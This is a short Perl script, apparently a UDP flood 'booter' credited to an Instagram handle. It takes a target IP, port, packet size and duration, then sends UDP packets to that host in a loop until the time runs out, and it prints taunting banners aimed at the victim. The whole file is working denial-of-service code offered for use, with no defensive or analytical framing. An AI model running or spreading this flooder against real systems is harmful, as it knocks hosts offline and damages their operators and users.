#!/usr/bin/perl### 
Coded By Ig @TuqdJr #
## 

use Socket;
use strict;

my ($ip,$port,$size,$time) = @ARGV;

my ($iaddr,$endtime,$psize,$pport);

$iaddr = inet_aton("$ip") or die "Cannot resolve This Skidder $ip\n";
$endtime = time() + ($time ? $time : 100);
socket(flood, PF_INET, SOCK_DGRAM, 17);

print " port " . ($port ? $port : "random") . " " .
    ($size ? "$size-byte" : "") . "

  ×Ig @TuqdJr's Booter×
           Get Hit Ig @TuqdJr's Booter BITCH
            //IP IS NULLED BY IT @TuqdJr\\

" .
  ($time ? "" : "") . "\n";
print "To stop Hitting Them With The IG @TuqdJr's Booter press Ctrl-C\n" 
unless $time;

for (;time() <= $endtime;) {
    $psize = $size ? $size : int(rand(1500000-64)+64) ;
    $pport = $port ? $port : int(rand(1500000))+1;

send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}